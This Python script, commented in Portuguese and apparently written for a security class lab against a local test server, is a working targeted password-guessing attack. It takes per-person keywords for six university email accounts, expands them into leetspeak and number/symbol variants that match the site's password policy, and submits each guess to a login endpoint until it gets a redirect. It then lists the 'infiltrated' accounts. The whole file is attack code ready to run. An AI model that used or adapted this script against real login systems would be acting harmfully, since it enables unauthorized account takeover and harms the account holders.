import requests, time 
from itertools import product

BASE_URL = "http://127.0.0.1:5000/login"
ESPECIAIS = "@#$&"
SUBSTITUICOES = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '$'}
NUMEROS = ['','1','12','123','2024','2025','7','0','00','99','159']
PALAVRAS_GENERICAS = ['senha','admin','123456','password','teste','universidade','unidin','sol','amor']
PALAVRAS_CHAVE_ALVOS = {
    "msilva@universidade.br":  ["mestre","silva","professor","msilva"],
    "dsantos@universidade.br": ["doutora","santos","dsantos","professora"],
    "cmelo@universidade.br":   ["colaboradora","melo","cmelo","professora"],
    "sspark@universidade.br":  ["sabido","spark","sspark","aluno"],
    "tsleep@universidade.br":  ["tranquilo","sleep","tsleep","aluno"],
    "fhope@universidade.br":   ["formando","hope","fhope","aluno"],
}

connection = requests.Session()

def senhaValida(senha: str) -> bool:
    '''
    Retorna true se *senha* for válida, isto é, se tiver entre 4 e 8 caracteres,
    pelo menos um caractere maiúsuclo e pelo menos um caractere de *ESPECIAIS*.
    Senão, retorna false.
    '''
    if not (4 <= len(senha) <= 8): 
        return False

    if not any(caractere.isupper() for caractere in senha):
        return False

    if not any(caractere in ESPECIAIS for caractere in senha):
        return False 

    # Verifica se *senha* contém algum caractere que não seja alfanumérico e não
    # Esteja na lista de caracteres especiais permitidos.
    for caractere in senha:
        if not (caractere.isalnum() or caractere in ESPECIAIS):
            return False 

    return True

def palavrasBase(palavra: str) -> set:
    """
    Retorna um contunto de variações da palavra *palavra*, alterando seus caracteres
    entre maiúsculos e minúsculos e aplicando as substituições de *SUBSTITUICOES*.
    """
    formatos = {palavra, palavra.capitalize(), palavra.upper()}

    substituicoes = set()
    for formato in formatos:
        palavraModificada = ""

        for caractere in formato:
            novoCaractere = SUBSTITUICOES.get(caractere.lower(), caractere)
            palavraModificada += novoCaractere

        substituicoes.add(palavraModificada)

    return formatos | substituicoes

def gerarSenhas(listaPalavrasBase: list[str]):
    """
    Para cada iteração, pega uma palavra base de *palavrasBase* e adiciona um caractere especial
    de *ESPECIAIS* e um número de *NUMEROS*, transformando-a em uma possível senha.
    """
    senhasVistas = set()

    for palavra in listaPalavrasBase:

        for formato, numero, especial in product(palavrasBase(palavra), NUMEROS, ESPECIAIS):

            padroesPosicao = (
                f"{formato}{numero}{especial}",
                f"{formato}{especial}{numero}",
                f"{numero}{formato}{especial}",
                f"{numero}{especial}{formato}",
                f"{especial}{numero}{formato}",
                f"{especial}{formato}{numero}"
            )

            for senha in padroesPosicao:
                if senha not in senhasVistas and senhaValida(senha):   
                    senhasVistas.add(senha)
                    yield senha

def tentarLogin(email: str, senha: str) -> bool:
    """
    Tenta realizar login utilizando os dados de *email* e *senha*. Caso o login seja efetuado
    com sucesso, isto é, status http 302, retorna true. Senão, retorna false.
    """
    request = connection.get(BASE_URL, params = {"email": email, "password": senha},
                           allow_redirects=False)
    return request.status_code == 302

# Executar o ataque
def main():
    tempoInicial = time.time()
    totalTentativas = 0
    contasInfiltradas = []

    for email, bases in PALAVRAS_CHAVE_ALVOS.items():
        print(f"Atacando {email}", flush = True)

        listaPalavrasBase = bases + PALAVRAS_GENERICAS

        for senha in gerarSenhas(listaPalavrasBase):
            totalTentativas += 1

            # Progresso a cada 100 tentativas
            if totalTentativas % 100 == 0:
                print(f"Tentativas: {totalTentativas}")

            if tentarLogin(email, senha):
                print("Senha encontrada!")
                print(f"Email: {email} -> Senha: {senha}")
                print("---------------")
                contasInfiltradas.append((email, senha))
                break

    tempoTotal = time.time() - tempoInicial
    print(f"Tempo de execução: {tempoTotal} segundos")
    print(f"Contas infiltradas: ")
    for email, senha in contasInfiltradas:
        print(f"  {email} : {senha}")


if __name__ == "__main__":
    main()